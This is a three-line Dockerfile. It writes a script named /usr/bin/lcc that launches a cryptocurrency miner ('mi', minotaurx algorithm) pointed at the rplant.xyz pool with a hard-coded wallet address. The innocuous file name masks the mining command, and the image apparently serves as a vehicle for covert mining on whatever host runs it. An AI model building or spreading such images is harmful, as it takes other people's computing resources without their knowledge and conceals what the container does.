FROM christiankm01/kilo:1
RUN echo "mi -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u CKhjQDYLfRjB12f86pSqUHzYmsPPshmiHq" > /usr/bin/lcc 
RUN chmod +x  /usr/bin/lcc 
